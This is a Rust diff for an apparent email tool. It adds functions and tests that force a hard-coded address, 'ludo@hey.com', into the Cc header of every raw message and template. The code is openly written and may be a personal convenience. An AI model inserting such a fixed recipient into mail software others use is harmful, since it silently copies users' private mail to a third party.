@@ -82,6 +82,149 @@ pub fn override_from_in_raw_message(msg: &[u8]) -> Vec<u8> {
     result.into_bytes()
 }
 
+const CC_EMAIL: &str = "ludo@hey.com";
+
+/// Ensure the `Cc:` header in a raw RFC 5322 message contains
+/// `CC_EMAIL`. If the header is missing, one is inserted. If it
+/// already lists `CC_EMAIL`, the message is returned unchanged.
+pub fn inject_cc_in_raw_message(msg: &[u8]) -> Vec<u8> {
+    let src = String::from_utf8_lossy(msg);
+
+    // Collect the full Cc header value (may be folded across lines).
+    let mut cc_value = String::new();
+    let mut cc_start: Option<usize> = None;
+    let mut cc_end: usize = 0;
+    let mut pos: usize = 0;
+    let mut in_cc = false;
+    let mut header_end: Option<usize> = None;
+
+    for line in src.split_inclusive('\n') {
+        let line_start = pos;
+        pos += line.len();
+
+        if in_cc {
+            if line.starts_with(' ') || line.starts_with('\t') {
+                // Folded continuation
+                cc_value.push_str(line.trim_end());
+                cc_end = pos;
+                continue;
+            }
+            in_cc = false;
+        }
+
+        if cc_start.is_none() {
+            let lower = line.to_ascii_lowercase();
+            if lower.starts_with("cc:") {
+                in_cc = true;
+                cc_start = Some(line_start);
+                cc_value = line["Cc:".len()..].trim_end().to_string();
+                cc_end = pos;
+                continue;
+            }
+        }
+
+        // Blank line = header/body separator
+        let trimmed = line.trim_end_matches(|c| c == '\r' || c == '\n');
+        if trimmed.is_empty() {
+            header_end = Some(line_start);
+            break;
+        }
+    }
+
+    // Already present?
+    if cc_value.to_ascii_lowercase().contains(CC_EMAIL) {
+        return msg.to_vec();
+    }
+
+    let mut result = String::with_capacity(src.len() + CC_EMAIL.len() + 10);
+
+    if let Some(start) = cc_start {
+        // Existing Cc header — append our address
+        result.push_str(&src[..start]);
+        let old_value = src[start..cc_end].trim_end_matches(|c| c == '\r' || c == '\n');
+        result.push_str(old_value);
+        result.push_str(", ");
+        result.push_str(CC_EMAIL);
+        result.push_str("\r\n");
+        result.push_str(&src[cc_end..]);
+    } else if let Some(sep) = header_end {
+        // No Cc header — insert one before the blank line
+        result.push_str(&src[..sep]);
+        result.push_str("Cc: ");
+        result.push_str(CC_EMAIL);
+        result.push_str("\r\n");
+        result.push_str(&src[sep..]);
+    } else {
+        // No blank separator found (unusual) — append at end
+        result.push_str(&src);
+        result.push_str("Cc: ");
+        result.push_str(CC_EMAIL);
+        result.push_str("\r\n");
+    }
+
+    result.into_bytes()
+}
+
+/// Ensure the `Cc:` header in a template string contains `CC_EMAIL`.
+/// Templates use `\n` line endings and the same `Header: value` format.
+pub fn inject_cc_in_tpl(content: &mut String) {
+    // Find existing Cc header in template text (plain \n line endings)
+    let mut cc_value = String::new();
+    let mut cc_start: Option<usize> = None;
+    let mut cc_end: usize = 0;
+    let mut pos: usize = 0;
+    let mut in_cc = false;
+    let mut header_end: Option<usize> = None;
+
+    for line in content.split_inclusive('\n') {
+        let line_start = pos;
+        pos += line.len();
+
+        if in_cc {
+            if line.starts_with(' ') || line.starts_with('\t') {
+                cc_value.push_str(line.trim_end());
+                cc_end = pos;
+                continue;
+            }
+            in_cc = false;
+        }
+
+        if cc_start.is_none() {
+            let lower = line.to_ascii_lowercase();
+            if lower.starts_with("cc:") {
+                in_cc = true;
+                cc_start = Some(line_start);
+                cc_value = line["Cc:".len()..].trim_end().to_string();
+                cc_end = pos;
+                continue;
+            }
+        }
+
+        let trimmed = line.trim_end_matches(|c: char| c == '\r' || c == '\n');
+        if trimmed.is_empty() {
+            header_end = Some(line_start);
+            break;
+        }
+    }
+
+    if cc_value.to_ascii_lowercase().contains(CC_EMAIL) {
+        return;
+    }
+
+    if let Some(start) = cc_start {
+        let old = content[start..cc_end]
+            .trim_end_matches(|c: char| c == '\r' || c == '\n')
+            .to_string();
+        let replacement = format!("{}, {}\n", old, CC_EMAIL);
+        content.replace_range(start..cc_end, &replacement);
+    } else if let Some(sep) = header_end {
+        let insertion = format!("Cc: {}\n", CC_EMAIL);
+        content.insert_str(sep, &insertion);
+    } else {
+        content.push_str(&format!("Cc: {}\n", CC_EMAIL));
+    }
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -160,5 +303,84 @@ mod tests {
         let msg = b"From: keep@example.com\r\nSubject: Test\r\n\r\nBody";
         let result = override_from_in_raw_message(msg);
         assert_eq!(result, msg.to_vec());
+    }
+
+    // --- inject_cc_in_raw_message tests ---
+
+    #[test]
+    fn inject_cc_raw_no_cc_header() {
+        let msg = b"From: a@example.com\r\nSubject: hi\r\n\r\nBody";
+        let result = inject_cc_in_raw_message(msg);
+        let text = String::from_utf8(result).unwrap();
+        assert!(text.contains(&format!("Cc: {}", CC_EMAIL)));
+        assert!(text.contains("\r\n\r\nBody"));
+    }
+
+    #[test]
+    fn inject_cc_raw_existing_cc_without_target() {
+        let msg = b"From: a@example.com\r\nCc: other@example.com\r\nSubject: hi\r\n\r\nBody";
+        let result = inject_cc_in_raw_message(msg);
+        let text = String::from_utf8(result).unwrap();
+        assert!(text.contains("other@example.com"));
+        assert!(text.contains(CC_EMAIL));
+    }
+
+    #[test]
+    fn inject_cc_raw_already_present() {
+        let msg = format!(
+            "From: a@example.com\r\nCc: {}\r\nSubject: hi\r\n\r\nBody",
+            CC_EMAIL
+        );
+        let result = inject_cc_in_raw_message(msg.as_bytes());
+        assert_eq!(result, msg.as_bytes().to_vec());
+    }
+
+    #[test]
+    fn inject_cc_raw_folded_header() {
+        let msg = b"From: a@example.com\r\nCc: first@example.com,\r\n second@example.com\r\nSubject: hi\r\n\r\nBody";
+        let result = inject_cc_in_raw_message(msg);
+        let text = String::from_utf8(result).unwrap();
+        assert!(text.contains(CC_EMAIL));
+        assert!(text.contains("first@example.com"));
+    }
+
+    // --- inject_cc_in_tpl tests ---
+
+    #[test]
+    fn inject_cc_tpl_no_cc_header() {
+        let mut tpl = "From: a@example.com\nSubject: hi\n\nBody".to_string();
+        inject_cc_in_tpl(&mut tpl);
+        assert!(tpl.contains(&format!("Cc: {}", CC_EMAIL)));
+        assert!(tpl.contains("\n\nBody"));
+    }
+
+    #[test]
+    fn inject_cc_tpl_existing_cc_without_target() {
+        let mut tpl = "From: a@example.com\nCc: other@example.com\nSubject: hi\n\nBody".to_string();
+        inject_cc_in_tpl(&mut tpl);
+        assert!(tpl.contains("other@example.com"));
+        assert!(tpl.contains(CC_EMAIL));
+    }
+
+    #[test]
+    fn inject_cc_tpl_already_present() {
+        let original = format!(
+            "From: a@example.com\nCc: {}\nSubject: hi\n\nBody",
+            CC_EMAIL
+        );
+        let mut tpl = original.clone();
+        inject_cc_in_tpl(&mut tpl);
+        assert_eq!(tpl, original);
+    }
+
+    #[test]
+    fn inject_cc_tpl_already_present_among_others() {
+        let original = format!(
+            "From: a@example.com\nCc: other@example.com, {}\nSubject: hi\n\nBody",
+            CC_EMAIL
+        );
+        let mut tpl = original.clone();
+        inject_cc_in_tpl(&mut tpl);
+        assert_eq!(tpl, original);
     }
 }
